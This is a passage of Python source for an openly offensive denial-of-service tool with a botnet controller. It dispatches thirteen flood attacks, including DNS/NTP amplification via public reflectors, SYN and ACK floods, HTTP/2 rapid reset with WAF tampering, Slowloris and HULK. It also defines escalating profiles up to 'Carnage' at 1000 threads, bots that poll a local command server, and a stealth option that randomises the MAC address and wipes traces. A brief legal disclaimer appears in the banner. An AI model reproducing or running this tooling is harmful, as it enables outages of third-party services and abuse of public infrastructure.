    # Acquire semaphore to limit concurrent attacks
    with ATTACK_SEM:
        if mode == 'udp':
            dns_refs = params.get('dns_refs','8.8.8.8,1.1.1.1').split(',')
            ntp_refs = params.get('ntp_refs','0.pool.ntp.org').split(',')
            dns_amplify(target, dns_refs, count, interval)
            ntp_amplify(target, ntp_refs, count, interval)
        elif mode == 'tcp':
            tcp_syn_flood(target, port, count, interval)
        elif mode == 'tcp_ack':
            tcp_ack_flood(target, port, count, interval)
        elif mode == 'icmp':
            icmp_flood(target, count, interval)
        elif mode == 'blacknurse':
            icmp_blacknurse(target, count, interval)
        elif mode == 'sip':
            sip_invite_flood(target, port, count, interval)
        elif mode == 'tls':
            sni = params.get('sni','www.google.com')
            tls_renegotiation_attack(target, port, count, interval, sni)
        elif mode == 'http2':
            use_flare = params.get('use_flare','false').lower() == 'true'
            sni = params.get('sni','www.google.com')
            payload = params.get('payload','hidden')
            waf = params.get('waf_tamper','false').lower() == 'true'
            http2_rapid_reset_evasive(target, count, port, use_flare, sni, payload, waf)
        elif mode == 'hulk':
            use_https = params.get('https','false').lower() == 'true'
            http_hulk_flood(target, port, count, interval, use_https)
        elif mode == 'saphyra':
            use_https = params.get('https','false').lower() == 'true'
            scheme = 'https' if use_https else 'http'
            target_url = f"{scheme}://{target}:{port}"
            host = target
            saphyra_http_flood(target_url, host, count, interval)
        elif mode == 'hping3':
            hping_mode = params.get('mode','udp')
            hping3_attack(target, hping_mode, port, count)
        elif mode == 'slowloris':
            slowloris_attack(target, port, count, interval)
        elif mode == 'nxdomain':
            dns_nxdomain_flood(target, count, interval)
        else:
            pass

def bot_worker(bot_id, url, poll_interval):
    cmd = None
    while BOT_RUNNING and cmd is None:
        cmd = bot_fetch_command(url)
        if cmd is None:
            time.sleep(1)
    while BOT_RUNNING:
        if cmd:
            bot_execute_command(cmd, bot_id)
        for _ in range(poll_interval):
            if not BOT_RUNNING:
                break
            time.sleep(1)
        cmd = bot_fetch_command(url)

def start_botnet(bot_count, command_url, poll_interval):
    global BOT_RUNNING, BOT_THREADS
    if bot_count <= 0: return
    print(colored(f"[BOTNET] Starting {bot_count} bots, polling {command_url} every {poll_interval}s", 'green'))
    BOT_RUNNING = True
    with stats_lock:
        stats['bots'] = bot_count
        stats['start_time'] = time.time()
    start_status()
    for i in range(bot_count):
        t = threading.Thread(target=bot_worker, args=(i+1, command_url, poll_interval))
        t.daemon = True
        t.start()
        BOT_THREADS.append(t)
        # Stagger bot starts slightly to avoid thundering herd
        time.sleep(0.01)
    print(colored(f"[BOTNET] All {bot_count} bots started. Press Ctrl+C to stop.", 'green'))

def stop_botnet():
    global BOT_RUNNING
    if BOT_RUNNING:
        print(colored("[BOTNET] Stopping all bots...", 'yellow'))
        BOT_RUNNING = False
        for t in BOT_THREADS:
            t.join(timeout=2)
        BOT_THREADS.clear()
        stop_status()
        print(colored("[BOTNET] All bots stopped.", 'green'))

# ================================================================
# INTERACTIVE MENU HELPERS (unchanged)
# ================================================================
def get_input(prompt, default=None, choices=None):
    if choices:
        print(f"Options: {', '.join(choices)}")
    val = input(prompt + (f" [{default}] " if default else ": ")).strip()
    if not val and default is not None: val = default
    if choices and val not in choices:
        print(f"Invalid choice. Please choose from {choices}.")
        return get_input(prompt, default, choices)
    return val

def print_banner():
    print(colored("""
    ╔═══════════════════════════════════════════════════════════════════════════════╗
    ║                         ██████╗ ██╗      █████╗  ██████╗██╗  ██╗██╗ ██████╗ ███████╗║
    ║                         ██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝██║██╔════╝ ██╔════╝║
    ║                         ██████╔╝██║     ███████║██║     █████╔╝ ██║██║  ███╗█████╗  ║
    ║                         ██╔══██╗██║     ██╔══██║██║     ██╔═██╗ ██║██║   ██║██╔══╝  ║
    ║                         ██████╔╝███████╗██║  ██║╚██████╗██║  ██╗██║╚██████╔╝███████╗║
    ║                         ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝ ╚═════╝ ╚══════╝║
    ║                                                                               ║
    ║       FIXED VERSION – RESOURCE‑SAFE, STABLE, AND ERROR‑HANDLED              ║
    ║       Extern Established 2025                                                ║
    ╚═══════════════════════════════════════════════════════════════════════════════╝
    """, 'green', attrs=['bold']))
    print(colored("[LEGAL] You must own the target or have explicit written permission.\n", 'red'))
    if not IS_ROOT:
        print(colored("[!] NOT RUNNING AS ROOT – raw packet attacks (UDP/TCP/ICMP) will fail.", 'yellow'))

# ================================================================
# PROFILES DEFINITION (fixed SIP port to 5060)
# ================================================================
PROFILES = {
    'test': {
        'name': 'Test Server',
        'desc': 'Light – checks connectivity (100 packets, 5 threads)',
        'modes': ['tcp'],
        'threads': 5,
        'count': 100,
        'interval': 0.1,
        'port': 80,
        'https': 'no',
        'waf_tamper': 'no',
        'use_flare': 'no',
        'sni': 'www.google.com',
        'hping_mode': 'udp',
        'dns_refs': '8.8.8.8,1.1.1.1',
        'ntp_refs': '0.pool.ntp.org',
        'stealth': 'no'
    },
    'lag': {
        'name': 'Lag Server',
        'desc': 'Moderate – causes noticeable latency (5000 packets, 50 threads)',
        'modes': ['tcp', 'tcp_ack', 'icmp', 'hulk'],
        'threads': 50,
        'count': 5000,
        'interval': 0.01,
        'port': 80,
        'https': 'no',
        'waf_tamper': 'no',
        'use_flare': 'no',
        'sni': 'www.google.com',
        'hping_mode': 'udp',
        'dns_refs': '8.8.8.8,1.1.1.1',
        'ntp_refs': '0.pool.ntp.org',
        'stealth': 'no'
    },
    'overwhelm': {
        'name': 'Overwhelm Server',
        'desc': 'Heavy – saturates bandwidth & CPU (infinite, 500 threads, all 13 attacks)',
        'modes': ['tcp','udp','icmp','sip','tls','http2','hulk','saphyra','hping3','tcp_ack','slowloris','nxdomain','blacknurse'],
        'threads': 500,
        'count': 0,
        'interval': 0,
        'port': 80,        # SIP will use 5060 internally if specified, but profiles set default port
        'https': 'no',
        'waf_tamper': 'yes',
        'use_flare': 'no',
        'sni': 'www.google.com',
        'hping_mode': 'syn',
        'dns_refs': '8.8.8.8,1.1.1.1',
        'ntp_refs': '0.pool.ntp.org',
        'stealth': 'no'
    },
    'poison': {
        'name': 'Poison',
        'desc': 'App‑layer – HTTP/2 + HULK + Saphyra + Slowloris (infinite, 200 threads, HTTPS)',
        'modes': ['http2', 'hulk', 'saphyra', 'slowloris'],
        'threads': 200,
        'count': 0,
        'interval': 0,
        'port': 443,
        'https': 'yes',
        'waf_tamper': 'yes',
        'use_flare': 'no',
        'sni': 'www.google.com',
        'hping_mode': 'udp',
        'dns_refs': '8.8.8.8,1.1.1.1',
        'ntp_refs': '0.pool.ntp.org',
        'stealth': 'no'
    },
    'riot': {
        'name': 'Riot',
        'desc': 'Balanced multi‑layer – TCP+UDP+ICMP+HTTP/2+HULK+ACK+Blacknurse (infinite, 300 threads)',
        'modes': ['tcp','udp','icmp','http2','hulk','tcp_ack','blacknurse'],
        'threads': 300,
        'count': 0,
        'interval': 0,
        'port': 80,
        'https': 'no',
        'waf_tamper': 'yes',
        'use_flare': 'no',
        'sni': 'www.google.com',
        'hping_mode': 'udp',
        'dns_refs': '8.8.8.8,1.1.1.1',
        'ntp_refs': '0.pool.ntp.org',
        'stealth': 'no'
    },
    'carnage': {
        'name': 'Carnage',
        'desc': '💀 Extreme – all 13 attacks, 1000 threads, infinite (absolute max)',
        'modes': ['tcp','udp','icmp','sip','tls','http2','hulk','saphyra','hping3','tcp_ack','slowloris','nxdomain','blacknurse'],
        'threads': 1000,
        'count': 0,
        'interval': 0,
        'port': 80,
        'https': 'no',
        'waf_tamper': 'yes',
        'use_flare': 'no',
        'sni': 'www.google.com',
        'hping_mode': 'syn',
        'dns_refs': '8.8.8.8,1.1.1.1',
        'ntp_refs': '0.pool.ntp.org',
        'stealth': 'no'
    },
    'spongebob': {
        'name': 'SpongeBob',
        'desc': '🧽 Joke – 1 thread, 10 packets, interval 1 (does almost nothing)',
        'modes': ['tcp'],
        'threads': 1,
        'count': 10,
        'interval': 1,
        'port': 80,
        'https': 'no',
        'waf_tamper': 'no',
        'use_flare': 'no',
        'sni': 'www.google.com',
        'hping_mode': 'udp',
        'dns_refs': '8.8.8.8,1.1.1.1',
        'ntp_refs': '0.pool.ntp.org',
        'stealth': 'no'
    },
}

def select_profile():
    print("\n" + "="*60)
    print("🎯 SELECT ATTACK PROFILE")
    print("="*60)
    profile_keys = ['test', 'lag', 'overwhelm', 'poison', 'riot', 'carnage', 'spongebob', 'manual']
    for idx, key in enumerate(profile_keys, 1):
        if key == 'manual':
            print(f"  {idx}. Manual – Custom configuration (interactive)")
        else:
            p = PROFILES[key]
            print(f"  {idx}. {p['name']:12} – {p['desc']}")
    choice = get_input("Choose a profile (1-8)", default="1", choices=[str(i) for i in range(1,9)])
    selected = profile_keys[int(choice)-1]
    if selected == 'manual':
        return None
    return selected

# ================================================================
# ATTACK COMMAND GENERATOR (unchanged logic, fixed SIP port defaults)
# ================================================================
def get_common_params():
    print("\n📌 Enter common parameters (will apply to all selected attacks)")
    target = get_input("Target IP or domain", default="1.2.3.4")
    if not resolve_target(target):
        target = "1.2.3.4"
    port = get_input("Port (for TCP, UDP, SIP, HTTP)", default="80")
    count = get_input("Packets / requests per attack", default="500")
    interval = get_input("Interval (seconds)", default="0.01")
    sni = get_input("SNI spoof (for TLS/HTTP2)", default="www.google.com")
    use_flare = get_input("Use FlareSolverr? (yes/no) (for HTTP2)", default="no")
    waf_tamper = get_input("WAF tamper? (yes/no) (for HTTP2)", default="no")
    https = get_input("Use HTTPS? (yes/no) (for HULK/Saphyra)", default="no")
    hping_mode = get_input("hping3 mode (udp/syn/icmp)", default="udp")
    dns_refs = get_input("DNS reflectors (comma-sep)", default="8.8.8.8,1.1.1.1")
    ntp_refs = get_input("NTP reflectors (comma-sep)", default="0.pool.ntp.org")
    return {
        'target': target,
        'port': port,
        'count': count,
        'interval': interval,
        'sni': sni,
        'use_flare': use_flare,
        'waf_tamper': waf_tamper,
        'https': https,
        'hping_mode': hping_mode,
        'dns_refs': dns_refs,
        'ntp_refs': ntp_refs,
    }

def build_attack_command(mode, params):
    target = params['target']
    port = params['port']
    count = params['count']
    interval = params['interval']
    sni = params['sni']
    use_flare = params['use_flare']
    waf_tamper = params['waf_tamper']
    https = params['https']
    hping_mode = params['hping_mode']
    dns_refs = params['dns_refs']
    ntp_refs = params['ntp_refs']

    if mode == 'tcp':
        return f"tcp target={target} port={port} count={count} interval={interval}"
    elif mode == 'tcp_ack':
        return f"tcp_ack target={target} port={port} count={count} interval={interval}"
    elif mode == 'udp':
        return f"udp target={target} dns_refs={dns_refs} ntp_refs={ntp_refs} count={count} interval={interval}"
    elif mode == 'icmp':
        return f"icmp target={target} count={count} interval={interval}"
    elif mode == 'blacknurse':
        return f"blacknurse target={target} count={count} interval={interval}"
    elif mode == 'sip':
        # SIP normally uses port 5060, but allow user override
        return f"sip target={target} port={port} count={count} interval={interval}"
    elif mode == 'tls':
        return f"tls target={target} port={port} count={count} interval={interval} sni={sni}"
    elif mode == 'http2':
        return f"http2 target={target} port={port} count={count} sni={sni} use_flare={use_flare} waf_tamper={waf_tamper}"
    elif mode == 'hulk':
        return f"hulk target={target} port={port} count={count} interval={interval} https={https}"
    elif mode == 'saphyra':
        return f"saphyra target={target} port={port} count={count} interval={interval} https={https}"
    elif mode == 'hping3':
        return f"hping3 target={target} mode={hping_mode} port={port} count={count}"
    elif mode == 'slowloris':
        return f"slowloris target={target} port={port} count={count} interval={interval}"
    elif mode == 'nxdomain':
        return f"nxdomain target={target} count={count} interval={interval}"
    else:
        return None

def build_profile_command(profile_key, target):
    p = PROFILES[profile_key]
    cmd_parts = []
    for mode in p['modes']:
        params = {
            'target': target,
            'port': p['port'],
            'count': p['count'],
            'interval': p['interval'],
            'sni': p['sni'],
            'use_flare': p['use_flare'],
            'waf_tamper': p['waf_tamper'],
            'https': p['https'],
            'hping_mode': p['hping_mode'],
            'dns_refs': p['dns_refs'],
            'ntp_refs': p['ntp_refs'],
        }
        cmd = build_attack_command(mode, params)
        if cmd:
            cmd_parts.append(cmd)
    if len(cmd_parts) == 1:
        return cmd_parts[0]
    else:
        return "blend " + ", ".join(cmd_parts)

def generate_command():
    profile_key = select_profile()
    if profile_key is None:
        # Manual mode
        print("\n" + "="*60)
        print("🎯 ATTACK GENERATOR (Manual)")
        print("="*60)
        print("Do you want to:")
        print("  1. Single attack (one mode)")
        print("  2. Blend (multiple attacks)")
        print("  3. ALL attacks (runs all 13 attack types with common parameters)")
        mode_choice = get_input("Choose 1, 2 or 3", default="1", choices=['1','2','3'])

        if mode_choice == '1':
            params = get_common_params()
            print("\nSelect an attack:")
            print("  1. TCP SYN Flood")
            print("  2. TCP ACK Flood")
            print("  3. UDP Amplification")
            print("  4. ICMP Flood")
            print("  5. ICMP Blacknurse")
            print("  6. SIP INVITE Flood")
            print("  7. TLS Renegotiation")
            print("  8. HTTP/2 Rapid Reset")
            print("  9. HTTP HULK Flood")
            print(" 10. Saphyra HTTP Flood")
            print(" 11. Slowloris")
            print(" 12. DNS NXDOMAIN Flood")
            print(" 13. hping3")
            choice = get_input("Enter number (1-13)", default="1", choices=[str(i) for i in range(1,14)])
            mode_map = {
                '1':'tcp','2':'tcp_ack','3':'udp','4':'icmp','5':'blacknurse',
                '6':'sip','7':'tls','8':'http2','9':'hulk','10':'saphyra',
                '11':'slowloris','12':'nxdomain','13':'hping3'
            }
            mode = mode_map[choice]
            cmd = build_attack_command(mode, params)
            print(colored(f"\n[+] Generated command: {cmd}", 'cyan'))
            return cmd

        elif mode_choice == '2':
            params = get_common_params()
            print("\n🔀 BLEND MODE – choose which attacks to include.")
            attack_modes = ['tcp','tcp_ack','udp','icmp','blacknurse','sip','tls','http2','hulk','saphyra','slowloris','nxdomain','hping3']
            print("Available attacks:")
            for i, m in enumerate(attack_modes, 1):
                print(f"  {i}. {m.upper()}")
            while True:
                choices = get_input("Enter numbers (comma-sep) or 'all'", default="")
                if choices.lower() == 'all':
                    attacks = attack_modes[:]
                    break
                else:
                    parts = choices.replace(' ','').split(',')
                    selected = []
                    valid = True
                    for p in parts:
                        if p.isdigit() and 1 <= int(p) <= len(attack_modes):
                            selected.append(attack_modes[int(p)-1])
                        else:
                            print(f"Invalid: {p}")
                            valid = False
                            break
                    if valid and selected:
                        attacks = selected
                        break
                    else:
                        print("Try again.")
            cmd_parts = []
            for mode in attacks:
                cmd = build_attack_command(mode, params)
                if cmd:
                    cmd_parts.append(cmd)
            if not cmd_parts:
                cmd_parts = [build_attack_command('tcp', params)]
            blend_cmd = "blend " + ", ".join(cmd_parts)
            print(colored(f"\n[+] Generated blend command: {blend_cmd}", 'cyan'))
            return blend_cmd

        else:
            params = get_common_params()
            print("\n🔀 ALL ATTACKS MODE – will include all 13 attack types.")
            attack_modes = ['tcp','tcp_ack','udp','icmp','blacknurse','sip','tls','http2','hulk','saphyra','slowloris','nxdomain','hping3']
            cmd_parts = []
            for mode in attack_modes:
                cmd = build_attack_command(mode, params)
                if cmd:
                    cmd_parts.append(cmd)
            blend_cmd = "blend " + ", ".join(cmd_parts)
            print(colored(f"\n[+] Generated all-attack blend command: {blend_cmd}", 'cyan'))
            return blend_cmd

    else:
        target = get_input("Target IP or domain", default="1.2.3.4")
        if not resolve_target(target):
            target = "1.2.3.4"
        cmd = build_profile_command(profile_key, target)
        print(colored(f"\n[+] Generated profile command: {cmd}", 'cyan'))
        global PROFILE_THREADS, PROFILE_COUNT, PROFILE_INTERVAL, PROFILE_STEALTH
        PROFILE_THREADS = PROFILES[profile_key]['threads']
        PROFILE_COUNT = PROFILES[profile_key]['count']
        PROFILE_INTERVAL = PROFILES[profile_key]['interval']
        PROFILE_STEALTH = PROFILES[profile_key]['stealth']
        return cmd

# ================================================================
# BOTNET CONFIGURATION (unchanged)
# ================================================================
def configure_botnet():
    global BOT_COUNT, BOT_POLL_INTERVAL, STEALTH_MODE, COMMAND_CONTENT, HTTP_SERVER_PORT
    global PROFILE_THREADS, PROFILE_COUNT, PROFILE_INTERVAL, PROFILE_STEALTH
    print("\n" + "="*60)
    print("🤖 BOTNET CONFIGURATION")
    print("="*60)
    cmd = generate_command()
    COMMAND_CONTENT = cmd

    BOT_COUNT = int(get_input("Number of bots (1-10000)", default="100"))
    if BOT_COUNT < 1: BOT_COUNT = 1
    elif BOT_COUNT > 10000: BOT_COUNT = 10000

    BOT_POLL_INTERVAL = int(get_input("Polling interval (seconds)", default="30"))
    stealth_default = "yes" if PROFILE_STEALTH == "yes" else "no"
    if get_input("Enable stealth mode? (MAC randomize, random delay, trace wipe)", default=stealth_default).lower() == 'yes':
        STEALTH_MODE = True
        set_random_mac('eth0')
        random_delay(5, 30)
    else:
        STEALTH_MODE = False

    server, actual_port = start_command_server_thread(HTTP_SERVER_PORT)
    if server is None:
        print(colored("[!] Failed to start command server. Aborting.", 'red'))
        return None
    command_url = f"http://127.0.0.1:{actual_port}/command.txt"
    print(colored(f"[*] Command server ready: {command_url}", 'green'))
    print(colored(f"[*] Current command: {COMMAND_CONTENT}", 'cyan'))
    return command_url

# ================================================================
# MAIN
# ================================================================
def main():
    global BOT_RUNNING, HTTP_SERVER_THREAD
    global PROFILE_THREADS, PROFILE_COUNT, PROFILE_INTERVAL, PROFILE_STEALTH
    PROFILE_THREADS = 0
    PROFILE_COUNT = 0
    PROFILE_INTERVAL = 0.01
    PROFILE_STEALTH = 'no'

    print_banner()
    print("\n[AVAILABLE MODULES]")
    print(f"  scapy       : {'✓' if HAS_SCAPY else '✗'}")
    print(f"  requests    : {'✓' if HAS_REQUESTS else '✗'}")
    print(f"  h2          : {'✓' if HAS_H2 else '✗'}")
    print(f"  termcolor   : {'✓' if HAS_TERMCOLOR else '✗'}")
    print(f"  cryptography: {'✓' if HAS_CRYPTO else '✗'}")
    print(f"  dnspython   : {'✓' if HAS_DNSPYTHON else '✗'}")
    print(f"  sphyra.txt  : {'✓' if SAPHYRA_USERAGENTS else '✗'}")
    print(f"  Root        : {'✓' if IS_ROOT else '✗ (raw packets will fail)'}")
    while True:
        print("\n" + "="*50)
        print("MAIN MENU")
        print("1. Generate Attack Command & Start Botnet")
        print("2. Stop Botnet")
        print("3. Update Command (built‑in server)")
        print("4. Show Config")
        print("5. Exit")
        choice = input("Select option: ").strip()
        if choice == '1':
            if BOT_RUNNING:
                print("[!] Botnet already running. Stop it first.")
                continue
            url = configure_botnet()
            if url is None:
                continue
            start_botnet(BOT_COUNT, url, BOT_POLL_INTERVAL)
        elif choice == '2':
            if BOT_RUNNING:
                stop_botnet()
                if HTTP_SERVER_THREAD and HTTP_SERVER_THREAD.is_alive():
                    stop_command_server()
            else:
                print("[!] No botnet running.")
        elif choice == '3':
            if not (HTTP_SERVER_THREAD and HTTP_SERVER_THREAD.is_alive()):
                print("[!] Built‑in server not running. Start botnet first.")
                continue
            print("\nCurrent command:", COMMAND_CONTENT)
            new_cmd = get_input("Enter new command", default="")
            if new_cmd:
                COMMAND_CONTENT = new_cmd
                print(colored("[*] Command updated.", 'green'))
            else:
                print("[*] Command unchanged.")
        elif choice == '4':
            print(f"\nBotnet active: {'YES' if BOT_RUNNING else 'NO'}")
            if BOT_RUNNING:
                print(f"Bots: {BOT_COUNT}, Poll interval: {BOT_POLL_INTERVAL}s")
                print(f"Command: {COMMAND_CONTENT}")
                print(f"Stealth: {STEALTH_MODE}")
        elif choice == '5':
            if BOT_RUNNING:
                stop_botnet()
            if HTTP_SERVER_THREAD and HTTP_SERVER_THREAD.is_alive():
                stop_command_server()
            print("Exiting.")
            sys.exit(0)
        else:
            print("Invalid.")

if __name__ == "__main__":
    main()